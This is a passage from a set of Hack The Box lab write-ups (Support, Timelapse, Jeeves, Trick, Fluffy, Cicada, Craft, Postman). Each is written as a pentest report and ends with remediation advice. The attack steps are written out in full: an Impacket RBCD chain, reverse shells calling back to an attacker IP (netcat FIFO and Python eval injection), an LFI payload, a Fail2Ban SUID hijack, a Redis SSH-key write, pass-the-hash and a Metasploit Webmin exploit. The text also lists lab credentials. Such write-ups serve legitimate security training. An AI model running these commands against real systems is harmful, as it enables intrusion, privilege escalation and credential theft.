Using the above password of ldap user started a LDAP query with a sAMAccountName=support and info field contains a potential password : 

support:Ironside47pleasure40Watchful

Logined the evil-winrm session as support user with above credential and got the user flag.

4. Privilege Escalation

Using the credential of support get the bloodhound data and visualized the outbound connection of the support@support.htb That Bloodhound graph shows a high-value attack path for the support user. We have found that the support user is a member of the SHARED SUPPORT ACCOUNTS group, which has GenericAll permissions over the DC.SUPPORT.HTB computer object.

Used the below path to get the 

└──╼ [★]$ addcomputer.py -computer-name 'ATTACKVM$' -computer-pass 'P@ssword123!' -dc-ip 10.129.230.181 support.htb/support:Ironside47pleasure40Watchful
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account ATTACKVM$ with password P@ssword123!.
┌─[us-dedivip-2]─[10.10.15.162]─[htb-mp-2183016@htb-5fjfqbhyda-htb-cloud-com]─[~]
└──╼ [★]$ rbcd.py -delegate-to 'DC$' -delegate-from 'ATTACKVM$' -action 'write' -dc-ip 10.129.230.181 support.htb/support:Ironside47pleasure40Watchful
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ATTACKVM$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ATTACKVM$    (S-1-5-21-1677581083-3380853377-188903654-6101)
┌─[us-dedivip-2]─[10.10.15.162]─[htb-mp-2183016@htb-5fjfqbhyda-htb-cloud-com]─[~]
└──╼ [★]$ getST.py -spn 'cifs/DC.support.htb' -impersonate Administrator -dc-ip 10.129.230.181 'support.htb/ATTACKVM$:P@ssword123!'
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
┌─[us-dedivip-2]─[10.10.15.162]─[htb-mp-2183016@htb-5fjfqbhyda-htb-cloud-com]─[~]
└──╼ [★]$ 

Used the cache to get access to C$ drive share with the administrator privilege.

Flag Extraction

5.Executive Summary

A. Secure Software Development (Immediate)

  • Remove Hardcoded Credentials: Never store service account credentials or encryption keys directly in application source code. Use secure secrets management solutions like Azure Key Vault or HashiCorp Vault.
  • Obfuscation is not Security: The XOR encoding used in UserInfo.exe was trivial to bypass. If local storage of secrets is required, use robust, OS-level encryption providers.

B. Active Directory Hardening

  • Sanitize LDAP Attributes: Remove sensitive information (like passwords) from non-secure LDAP fields such as info, description, or notes.
  • Enforce Principle of Least Privilege: Audit and remove the GenericAll permission granted to the SHARED SUPPORT ACCOUNTS group over the Domain Controller object. This permission is extremely high-risk.
  • Restrict Computer Account Creation: Set the ms-DS-MachineAccountQuota attribute to 0 at the domain level to prevent standard users from creating rogue computer accounts used in RBCD attacks.

C. Infrastructure Security

  • Disable Anonymous SMB Access: Restrict share enumeration to authenticated users only to prevent the discovery of internal tools and installers.
  • Monitor for Delegation Changes: Implement logging and alerts for changes to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute, as this is a primary indicator of an RBCD attack.

title: Timelapse
content:
Attack Type : LAPS Password Retrieval Attack or LAPS ABUSE

1.Executive Summary

The penetration test of the Timelapse machine revealed a critical security chain starting from anonymous information disclosure and ending in a full domain compromise. The initial entry point was an unsecured SMB share named Shares, which allowed guest access to a protected backup file. Through offline brute-force attacks on a ZIP archive and a PFX certificate, access was gained as the user legacyy.

Lateral movement was achieved by analyzing PowerShell history files, which exposed cleartext credentials for the svc_deploy service account. The final escalation to Domain Admin (Administrator) was possible due to a significant misconfiguration in the Local Administrator Password Solution (LAPS). Specifically, the svc_deploy account was found to be a member of the LAPS_Readers group, which had been granted permission to read the cleartext local administrator password for the Domain Controller (DC01). By retrieving this password from the Active Directory attributes, full control over the domain was established.

Table of Compromise

Phase Description Tools Used Credential / Outcome
Reconnaissance Identified SMB shares and extracted winrm_backup.zip. nmap, nxc, smbclient Anonymous Access
Initial Access Cracked ZIP and PFX passwords; extracted SSL keys for WinRM. john, openssl, evil-winrm legacyy / User Flag
Lateral Movement Found service account credentials in PSReadLine history. type (PowerShell) svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
Privilege Escalation Enumerated AD and abused LAPS read permissions. bloodhound-python, Get-ADComputer Administrator / Root Flag

2.Reconnaissance & Enumeration

2.1 SMB Enumeration : Accessed a shares names Shares with the guest username and a no credentials. It contains a file winrm_backup.zip protected via password. used the zip2john to get the hash of pass of file. Now used the rockyou.txt wordlist to crack the zipped file password.

winrm_backup.zip:supremelegacy

3. VULNERABILITY ANALYSIS & EXPLOITATION

Unzipped the file contains a file legacyy_dev_auth.pfx . Using the pfx2john to get the password hash of the file. Again used the rockyou.txt wordlist to crack this hash and go the password.

legacyy_dev_auth.pfx:thuglegacy

┌─[us-dedivip-2]─[10.10.15.162]─[htb-mp-2183016@htb-bmdgjh4z0g-htb-cloud-com]─[~]
└──╼ [★]$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy.key -nodes
Enter Import Password:
┌─[us-dedivip-2]─[10.10.15.162]─[htb-mp-2183016@htb-bmdgjh4z0g-htb-cloud-com]─[~]
└──╼ [★]$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy.crt
Enter Import Password:
┌─[us-dedivip-2]─[10.10.15.162]─[htb-mp-2183016@htb-bmdgjh4z0g-htb-cloud-com]─[~]
└──╼ [★]$ ls
cacert.der  Documents  legacyy.crt           legacyy.key  my_data   pfx_hash.txt  Public       Templates  winrm_backup.zip
Desktop     Downloads  legacyy_dev_auth.pfx  Music        nmap.txt  Pictures      rockyou.txt  Videos     winrm_hash.txt

Got the legacyy.crt and legacyy.key . Used it to gain the evil-winrm session and got the user flag.

4. Privilege Escalation

From the winrm session of legacyy checked the PowerShell history on path $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

It gave credential of user svc_legacy

svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV

Used the bloodhound-python to get the mapping of the Active Directory. Get to know the already pwned user svc_local is member of LAPS_READER@TIMELAPSE.HTB that have a ReadLAPSPassword permission over DC01.TIMELAPSE.HTB

Using this serious flaw . We read the Administrator password from the evil-winrm session of the svc-deploy Method 1:

Method 2:

Method 3: 

administrator:omGa6btU37rFp}sL+%{zFG%2

Retrieved the root Flag from the TRX users Desktop.

6. Remediation

6.1 Secure Information Storage & SMB

  • Restrict SMB Guest Access: Disable guest and anonymous access to network shares. Ensure that only authenticated and authorized users can access sensitive files.
  • Audit Backup Procedures: Sensitive files (like PFX certificates) should not be stored on publicly accessible network shares. Use a dedicated, encrypted vault for credential storage.

6.2 Credential Management & Hardening

  • Sanitize PowerShell History: Implement policies to clear PSReadLine history or prevent the storage of commands containing sensitive strings (e.g., using -AsPlainText).
  • Rotate Compromised Passwords: Immediately change the passwords for legacyy, svc_deploy, and the Administrator accounts.
  • Enforce Strong Password Policies: Use long, complex passwords that are resistant to offline dictionary attacks using wordlists like rockyou.txt.

6.3 Active Directory & LAPS Hardening

  • Restrict LAPS Permissions: Audit the ms-Mcs-AdmPwd attribute permissions. Ensure that only a strictly limited group of highly trusted administrators can read LAPS passwords. Remove unnecessary groups (like LAPS_Readers) from this privilege.
    • Implement Managed Service Accounts (gMSA): Transition service accounts like svc_deploy to gMSAs to prevent password exposure and automate password rotation.
  • Monitor for Abnormal Activity: Enable logging for Event ID 4662 (An operation was performed on an object) to detect when non-administrative users attempt to read the LAPS password attribute.

title: HTB Machine Writeup- Jeeves
content:
Date : January 25,2026 Difficulty : Medium OS: Windows Target : 10.129.7.220

1.Executive Summary :

The compromise of the Jeeves workstation was achieved by exploiting an unauthenticated Jenkins instance on a non-standard port (50000). This allowed for initial Remote Code Execution (RCE) via a Groovy script. Following initial access, local enumeration revealed a KeePass password database (.kdbx). By exfiltrating and cracking this database, an NTLM hash for the Administrator was recovered. Final privilege escalation was achieved via Pass-the-Hash (PtH), and the root flag was retrieved from an NTFS Alternate Data Stream (ADS).

Table of Compromise

Stage Technique Account Involved Credential / Access Gained Impact
Initial Access Unauthenticated Jenkins Instance - Access to Jenkins Script Console on port 50000 Ability to execute arbitrary code
Exploitation Jenkins RCE (Groovy / Batch Command) kohsuke PowerShell reverse shell as jeeves\kohsuke Initial low-privileged shell
Credential Access KeePass Database Discovery & Exfiltration kohsuke CEH.kdbx database exfiltrated Password database obtained
Credential Cracking KeePass Cracking (keepass2john + John) - Master password: moonshine1 Database unlocked
Credential Access KeePass Decryption Administrator NTLM hash: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 Administrator hash recovered
Privilege Escalation Pass-the-Hash (psexec.py) Administrator Full administrative shell System-level access
Post-Exploitation NTFS Alternate Data Stream Enumeration Administrator Root flag hidden in hm.txt:root.txt:$DATA Root flag obtained

2.Information Gathering and Enumeration :

2.1 Port Scanning An initial Nmap scan revealed multiple open ports, including standard web services and a high-port Jetty instance:

  • Port 80 (HTTP): Microsoft IIS 10.0 (Running "Ask Jeeves" search engine)

  • Port 135 (RPC): Microsoft Windows RPC

  • Port 445 (SMB): Microsoft-DS (Workgroup: WORKGROUP)

  • Port 50000 (HTTP): Jetty 9.4.z-SNAPSHOT

2.2 Web Enumeration

  • Port 80: Contained a static search page. Manual testing revealed a SQL error .

  • Port 50000: Searching through the web found a possible path on Jenkins navigating to /askjeeves exposed an unauthenticated Jenkins dashboard.

3.Exploitation

3.1 Jenkins Remote Code Execution (RCE) Since the Jenkins instance required no authentication, the "Script Console" or a "New Item" build step could be used to execute system commands.

  • Payload: A PowerShell reverse shell one-liner was injected into the "Execute Windows batch command" build step.

  • Execution: Upon triggering the "Build Now" command, a reverse shell was established as user jeeves\kohsuke.

4.Privilege Escalation

4.1 Database Exfiltration During enumeration of the kohsuke home directory, a KeePass database was discovered at C:\Users\kohsuke\Documents\CEH.kdbx.

  • Exfiltration: The file was exfiltrated using Base64 encoding to prevent corruption during transfer.

  • Cracking: Using keepass2john, the hash was extracted and cracked with john and the rockyou.txt wordlist.

    • Master Password: moonshine1

4.2 Credential Harvesting Decrypting the database revealed several entries. The "Backup stuff" entry contained an NTLM hash for the Administrator:

  • Admin Hash: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00

4.3 Lateral Movement (Pass-the-Hash) Using psexec.py, a session was established as the Administrator using the recovered NTLM hash.

psexec.py administrator@10.129.7.220 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00

5.Root Flag Retrieval

Standard directory listings on the Administrator’s desktop showed an hm.txt file stating "The flag is elsewhere". Advanced enumeration revealed the flag was hidden in an Alternate Data Stream.

  • Command: dir /R

  • Stream Found: hm.txt:root.txt:$DATA

  • Reading Flag: Get-Content hm.txt -Stream root.txt

6. Remediation

  • Secure Jenkins Instance: Never expose Jenkins (especially on non-standard ports like 50000) to the internet or internal networks without strong authentication. Disable or restrict the Script Console and anonymous access. Implement proper RBAC and require authentication for all administrative functions.
  • Patch and Update Services: Keep Jenkins and Jetty web server updated to the latest secure versions. Regularly review and remove unnecessary build tools, plugins, and legacy configurations.
  • Credential Hygiene: Avoid storing sensitive credentials (including NTLM hashes) in password managers like KeePass if the master password is weak. Use strong, unique master passwords (minimum 20+ characters) or preferably enterprise password vault solutions with proper access controls.
  • Least Privilege Principle: Run Jenkins and other services under dedicated low-privileged accounts instead of accounts with administrative rights. Limit the kohsuke user privileges significantly.
  • NTLM Hash Protection: Minimize exposure of NTLM hashes. Implement SMB signing enforcement and restrict Pass-the-Hash attacks by enabling Credential Guard and restricting administrative logons.
  • File System Security: Regularly audit for and educate administrators about NTFS Alternate Data Streams (ADS). Use tools that properly display hidden streams during normal file operations.
  • Web Application Hardening: Sanitize and validate all user inputs on web applications (e.g., the Ask Jeeves search functionality) to prevent SQL injection and other injection attacks.
  • Network Segmentation: Place administrative tools like Jenkins on isolated management networks with strict firewall rules and access control lists.

title: HTB Machine Writeup- Trick
content:
**Date:** January 24, 2026 **Difficulty:** Easy **OS:** Linux

1.Executive Summary :

The "Trick" machine was compromised via a multi-stage attack starting with the DNS enumeration, followed by the SQL injection (SQLi) on a sub-domain, Local File Inclusion (LFI) via log poisoning, and finally a privilege escalation through a misconfiguration Fail2Ban directory

Table of Compromise

Stage Technique Account Involved Credential / Access Gained Impact
Reconnaissance DNS Zone Transfer - Discovery of preprod-payroll.trick.htb Hidden subdomain identified
Initial Access SQL Injection (SQLi) - Time-based blind SQLi on login portal Ability to read files via SQLmap
Web Enumeration SQLi + File Read - Read /etc/nginx/sites-enabled/default Discovery of preprod-marketing.trick.htb
Exploitation Local File Inclusion (LFI) - LFI via page parameter (bypassed with ....//) Arbitrary file read capability
Exploitation Log Poisoning (SMTP) - Injected PHP code into mail log via malicious email Remote Code Execution (RCE)
Initial Foothold Reverse Shell via LFI michael Netcat FIFO reverse shell as user michael + User flag Low-privileged shell access
Privilege Escalation Sudo Misconfiguration Enumeration michael sudo -l revealed NOPASSWD on /etc/init.d/fail2ban restart Privilege escalation path identified
Privilege Escalation Fail2Ban Action Hijacking michael (security group) Write access to /etc/fail2ban/action.d/ + SUID on /bin/bash Root shell via SUID bash
Domain Compromise Root Shell root Full root access + Root flag at /root/root.txt Complete system compromise

2.Information Gathering and Enumeration :

2.1 Port Scanning Initial Nmap scan reveled that the port 22(SSH),25(SMTP),53(DNS),80(HTTP) is open.

2.2 DNS Enumeration Guesswork to know the trick.htb as main domain. Added this domain in the hosts file The zone transfer attempt reveal a hidden virtual host: preprod-payroll.trick.htb

2.3 Web Enumeration The preprod-payroll.trick.htb subdomain hosted a login page of Employee's Payroll Management System . The login portal is vulnerable to time-based SQL injection in login field.

3.Exploitation

3.1 SQL Injection (Discovery of vhosts) Using sqlmap read a file /etc/nginx/sites-enabled/default which revealed a another vhost: preprod-marketing.trick.htb

3.2 Local File Inclusion (LFI) Fuzzing through the parameter and found page parameter . Using the LFI-Jhaddix.txt Payload found page parameter is vulnerable to LFI injection. Filters were bypassed by using ....// encoding.

Payload : curl http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//etc/passwd

3.3 Remote Code Execution (RCE) via Log Poisoning The target was running Postfix (SMTP). By sending a malicious email to a local user, I injected PHP code into the mail log.

This gave a RCE

3.4 Gaining a Shell: Using a Netcat FIFO reverse shell payload via the c parameter: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [Your_IP] 4444 >/tmp/f

Note : Sending a

4.Privilege Escalation

4.1 Post-Exploitation Enumeration After gaining a shell as user michael, I checked sudo permissions: sudo -l

Output: (root) NOPASSWD: /etc/init.d/fail2ban restart

I also noted Michael was in the security group, which had write access to /etc/fail2ban/action.d/

4.2 Fail2Ban Action Hijacking Fail2Ban runs as root. By hijacking the "ban" action, I could execute arbitrary commands.

  1. The Exploit: I replaced the iptables-multiport.conf file with a payload that sets the SUID bit on /bin/bash rm -f /etc/fail2ban/action.d/iptables-multiport.conf echo -e '[Definition]\nactionban = chmod +s /bin/bash\nactionunban = \n' > /etc/fail2ban/action.d/iptables-multiport.conf sudo /etc/init.d/fail2ban restart

Triggering the Ban: I spammed failed SSH login attempts from my attack machine to trigger the Fail2Ban "actionban" command.

4.3 Root Access Once the ban was triggered, /bin/bash became a SUID binary.

Now running bash -p give the root access. Now read the final root flag at /root/root.txt

5.Remediation

  • Sanitize Inputs: Use prepared statements for all SQL queries to prevent SQLi.

  • Restrict LFI: Implement a whitelist of allowed files for the page parameter rather than direct file inclusion.

  • Secure Permissions: The directory /etc/fail2ban/action.d/ should be writable only by the root user.

  • Principle of Least Privilege: Michael should not have sudo access to restart security services if he can also modify their configurations.

title: HTB Machine Writeup-Fluffy
content:
Date : January 25,2026 Difficulty : Easy OS: Windows

Given : Credential : j.fleischman / J0elTHEM4n1990!

1.Executive Summary

This easy-difficulty Windows Active Directory assessment targeted the fluffy.htb domain (DC01.fluffy.htb). Starting with the provided credentials (j.fleischman : J0elTHEM4n1990!), the attacker accessed an SMB share containing an internal PDF that disclosed a critical vulnerability, CVE-2025-24071. By uploading a specially crafted ZIP file via SMB, the attacker triggered an NTLM hash leak, which was captured using Responder. The hash for p.agila was cracked using Hashcat with the rockyou wordlist, yielding the password prometheusx-303. With p.agila's access, BloodHound enumeration revealed a privilege escalation path involving the WINRM_SVC account. This path ultimately enabled further compromise toward Domain Controller access and full domain control.

Table of Compromise

Stage Technique Account Involved Credential / Access Gained Impact
Initial Access Provided Credentials j.fleischman j.fleischman:J0elTHEM4n1990! Low-privileged domain user
Credential Access SMB Share Enumeration j.fleischman Access to internal PDF disclosing CVE-2025-24071 Vulnerability intelligence gained

Credential Access NTLM Hash Capture (Responder) p.agila NTLM hash of p.agila captured Service/user hash obtained
Credential Cracking Hash Cracking (Hashcat + rockyou) p.agila p.agila:prometheusx-303 User account compromise
Privilege Escalation BloodHound Enumeration p.agila Identified attack path to WINRM_SVC Privilege escalation path discovered
Lateral Movement WinRM Access (via discovered path) WINRM_SVC Access via WINRM_SVC account Further domain access

2.Information Gathering and Enumeration

2.1 Port Scanning Initial nmap scan revealed the port 53(DNS),88(kerberos-sec),139(netbios-ssn),389(ldap),445(microsoft-ds?),464(kpasswd?),593(ncacn_http),636(ssl/ldap),3268(ldap),3269(ssl/ldap)

Fully Qualified Domain Name (FQDN : dc01.fluffy.htb

**3.Exploitation

3.1 CVE-2025-24071 Exploitation Login into smb with given cred got pdf abt the fluffy internal machine says few CVE to patch one of them were CVE-2025-24071 (Critical) allow  an attacker leak an NTLM hash. Exploiting this CVE by uploading a specifically crafted zipped file via smb.

On starting the responder it captured the hash of user p.agila

Cracked the hash via hashcat using the `rockyou.txt` wordlist give the creds as `prometheusx-303` `p.agila : prometheusx-303`

3.2 Using bloodhound-python Using the p.agila creds to gets the data using the bloodhound-python and analyse the relation between the Computer and users and how to reach the domain controller.

This is the pathway from P.AGILA to WINRM_SVC

Remediation :

  • Patch Management: Immediately apply security updates for CVE-2025-24071 and all other known vulnerabilities on domain controllers and file servers. Establish a regular patching schedule with proper testing.
  • Disable NTLM where possible: Enforce Kerberos authentication and disable NTLM relay attacks by enabling SMB signing, LDAP signing, and channel binding. Consider implementing NTLM restrictions or EPA (Extended Protection for Authentication).
  • Least Privilege & File Share Hardening: Restrict SMB share permissions and avoid storing sensitive internal documentation (such as vulnerability PDFs) on accessible shares. Limit anonymous and low-privileged access to shares.
  • Responder / Relay Protections: Deploy network-level protections against NTLM relay attacks (e.g., using tools like ntlmrelayx mitigations, firewall rules, or SMB relay blockers). Monitor for unexpected NTLM authentication attempts.
  • Regular BloodHound Audits: Perform periodic Active Directory enumeration using BloodHound to identify and remediate dangerous permission paths, especially those leading to high-privileged service accounts like WINRM_SVC.
  • Credential Hygiene: Enforce strong, unique passwords for all accounts and implement Multi-Factor Authentication (MFA) wherever possible to mitigate cracked password usage.
  • Monitoring: Enable auditing for SMB file uploads, NTLM authentication events, and suspicious ZIP file processing. Monitor for anomalous hash capture or relay activity.

title: CICADA
content:
Difficulty : Easy OS : Windows Target : 10.129.231.149 Severity : [CRITICAL - 9.8]

1.Executive Summary

Overview: The security assessment of the Cicada domain controller revealed a critical attack chain leading to full forest-level compromise. The vulnerability originated from unauthenticated SMB guest access, which exposed sensitive internal documentation containing a hardcoded default password.

Impact: By leveraging this initial leak through automated password spraying, an attacker pivoted through multiple low-privileged accounts by exploiting insecurely stored credentials in Active Directory metadata and localized backup scripts. The final escalation to Domain Administrator was achieved by exploiting a misconfigured account holding SeBackupPrivilege, allowing for the bypass of filesystem Access Control Lists (ACLs) and the extraction of local registry hives. This resulted in a successful Pass-the-Hash (PtH) attack, granting full administrative control over the domain.

1.1 Table of Compromise

Step Source Destination Vector
1 Guest Michael SMB Share Disclosure
2 Michael David AD User Metadata
3 David Emily Plaintext Script Creds
4 Emily Administrator SeBackupPrivilege Abuse

2.Reconnaissance & Enumeration

2.1 Access to SMB Share via guest users and enumerated the Shares and the Default Password of the Cicada Corp from a file name Notice from HR.txt

Default Password : Cicada$M6Corpb*@Lp#nZp!8

3. VULNERABILITY ANALYSIS & EXPLOITATION

3.1 Using the Default password to login

Tried Default Password spraying attack on the users with the Default Password and got one match.

michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8

Using the credential of michael.wrightson enumerated the ldap users and got access to password of david.orelious in the metadata of the Active Directory.

david.orelious:aRt$Lp#7t*VQ!3

Accessing the share DEV using the credential of david.orelious gave a backup script to run in the PowerShell contains credential of the emily.oscars .

emily.oscars:Q!3@Lp#M6b*7t*Vt

Got the user.txt file on the Desktop of emily.oscars

4. Privilege Escalation

4.1 emily.oscars have a dangerous Privilege associated with the account SeBackupPrivilege

To gain full administrative control, The Consultant exploited the SeBackupPrivilege assigned to my user account, a privilege designed to allow backup operators to bypass file system Access Control Lists (ACLs). Since the SAM and SYSTEM hives are normally protected by the kernel and restricted by strict permissions to prevent credential dumping, The SeBackupPrivilege was leveraged to bypass those security descriptors entirely. By calling the Windows API with backup semantics, I forced the operating system to ignore the standard "Access Denied" restrictions, allowing me to successfully copy the live sam.hiv and system.hiv files into my working directory. This was a critical step because the SAM database contains the encrypted NTLM hashes for all local accounts, while the SYSTEM hive stores the Boot Key (Syskey) essential for their decryption. After using the Evil-WinRM download command to transfer these hives to my local attack machine, I utilized secretsdump to parse the files and cross-reference the Boot Key against the encrypted database. This resulted in the clear-text extraction of the Administrator NTLM hash, effectively granting me the ability to authenticate as the highest-privileged user via a Pass-the-Hash attack.

4.1 Hash dump Using the impacket-secretsdump tool to dump the hash of the local administrator.

5. Administrative Access

Using the hash to perform a Pass-the-Hash attack to get the administrative access of the system and get the root flag of the system.

6. Remediation

  • Disable Guest SMB Access: Restrict anonymous and guest access to all SMB shares. Ensure that only authenticated users with a specific "Need to Know" can access internal files.
  • Enforce Account Least Privilege: Review all users assigned SeBackupPrivilege. This privilege should only be granted to dedicated backup service accounts that are heavily restricted and cannot be used for interactive logins (like WinRM).
  • Remove Plaintext Credentials: Sanitize all Active Directory "Description" fields and script files (specifically in the DEV share) to ensure no passwords or sensitive metadata are stored in cleartext.
  • Implement LAPS: Deploy Windows Local Administrator Password Solution (LAPS) to ensure unique, rotating local administrator passwords across the domain, preventing lateral movement via Pass-the-Hash.
  • Enable Credential Guard: Use Windows Defender Credential Guard to protect NTLM hashes in a virtualized container, making them inaccessible even to users with administrative rights.

title: HTB Machine Writup- Craft
content:
Date: January 24, 2026 Difficulty: Medium OS: Linux

1.Executive Summary :

The "Craft" machine was successfully compromised by exploiting a Remote Code Execution (RCE) vulnerability in a Python-based API. This led to an initial foothold in a Docker container. Through credential harvesting from the application source code and database enumeration, access was escalated to a system user. Final privilege escalation to the host's root account was achieved by exploiting a misconfigured HashiCorp Vault SSH secrets engine.

2.Information Gathering and Enumeration :

2.1 Port Scanning Nmap scan reveal the three ports opened . Further port scan revealed the domain name craft.htb and the machine info reveal the gogs.craft.htb.

2.2 Web API Analysis The target hosts a Gogs repository and an API at api.craft.htb. Analysis of the source code (replicated locally) revealed the use of the eval() function on user-supplied input in the abv field.

2.3 Password Enumeration Cloning the whole repo of Craft-API in the local machine and going through the commit found the credentials dinesh:4aUh0A8PbVJxgd using the creds to get the JWT to authenticate the request in the API

2.3 Exploitation (RCE) Roaming around lot and going through the multiple different payload. Found the payload that worked. By sending a crafted JSON POST request with a Python one-liner reverse shell, a connection was established.

Q. Why this payload worked ? Ans : The successful payload (__import__('os').system('...')) worked because of three specific factors: Dynamic Module Loading: By using __import__('os'), the payload bypassed the need for the import os statement to be present in the original source code, allowing access to system-level functions. Execution Context: The os.system() function executes the provided string directly in the system's shell (/bin/sh) rather than the Python interpreter. This allowed the use of shell-specific syntax and binaries (like python3 -c or nc) that the eval() function would otherwise reject as invalid Python syntax. Satisfying the Comparison: os.system() returns the exit status of the command (typically 0 for success). When the eval() statement finished, it simplified to if 0 > 1:. Since this is a valid boolean comparison, the script did not crash, effectively "hiding" the execution within a standard Response 201: Success message while the reverse shell stayed active in the background.

"__import__('os').system('python3 -c \"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\'10.10.15.162\\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\'/bin/sh\\')\"')"

3.Lateral Movement:

3.1 Credential harvesting : Searching the application directory /opt/app/craft_api/settings.py revealed cleartext database credentials for the craft user. craft:qLGockJ6G2J75O

3.2 Database Enumeration : Using the harvested credentials, the MySQL database at 172.20.0.4 was queried to dump the user table. Found three credential : dinesh:4aUh0A8PbVJxgd ebachman:llJ77D8QFkLPQB gilfoyle:ZEU3N8WNM2rh4T

4.Privilege Escalation:

4.1 Gogs Exploitation Using Gilfoyle's credentials, I logged into the Gogs instance. Within the craft-infra repository, an encrypted SSH private key was discovered.

4.2 SSH Access (Host)

The key was decrypted locally using the password ZEU3N8WNM2rh4T. Using this key, I gained SSH access to the host machine as the user gilfoyle.

4.3 Root Escalation (Vault SSH OTP) Gilfoyle's home directory contained a .vault-token. This token granted access to the root_otp role in Vault.

By executing the vault ssh subcommand, a One-Time Password (OTP) for the root user was generated.

vault ssh -mode=otp -role=root_otp root@10.129.229.45

5.Post-Exploitation:

With the OTP, I successfully logged in as root and captured the final flag.

6.Recommendations

6.1 Input validation : Stop using eval() . Use float() for type conversion ast.literal_eval() for safe evaluation. 6.2 Secrets Management : Do not store sensitive credentials in cleartext file like settings.py 6.3 Vault Hardening : Restrict Vault tokens to specific source IPs and reduce the lifetime of generate OTPs.

title: HTB Machine Writup-Postman
content:
HTB Postman - Writeup

Date : January 28, 2026 Difficulty : Easy OS: Linux IP: 10.129.2.1

1. Executive Summary

The Postman machine involves exploiting an unauthenticated Redis server to gain a foothold as the 'redis' user. Post-exploitation enumeration reveals a backup SSH private key belonging to the user 'matt'. After cracking the key's passphrase, the credentials are used to exploit an authenticated Command Injection vulnerability in Webmin version 1.910 to achieve root privileges.

2. Information Gathering and Enumeration

2.1 Port Scanning Initial nmap scan revealed ports 22 (SSH), 80 (HTTP), 6379 (Redis), and 10000 (Webmin).

nmap -sV -v -A -p22,80,10000,6379 10.129.2.1

3. Exploitation

3.1 Redis Unauthenticated RCE Redis (v4.0.9) was found running without authentication. I exploited this by writing my public SSH key into the redis user's .ssh directory.

ssh-keygen -t rsa -f redis_key (echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > payload.txt

cat payload.txt | redis-cli -h 10.129.2.1 -x set crackit

redis-cli -h 10.129.2.1 
10.129.2.1:6379> config set dir /var/lib/redis/.ssh 
10.129.2.1:6379> config set dbfilename "authorized_keys" 
10.129.2.1:6379> save

ssh -i redis_key redis@10.129.2.1

ssh2john id_rsa.bak > matt.hash
john --wordlist=rockyou.txt matt.hash

Cracked Passphrase: computer2008

4. Privilege Escalation

4.1 Webmin 1.910 Command Injection The user 'matt' shared the same password (computer2008) for the Webmin interface. Webmin 1.910 is vulnerable to an authenticated RCE in the 'Package Updates' module (CVE-2019-12840).

msfconsole
use exploit/linux/http/webmin_packageup_rce
set RHOSTS 10.129.2.1
set SSL true
set USERNAME matt
set PASSWORD computer2008
set LHOST 10.10.15.162
exploit
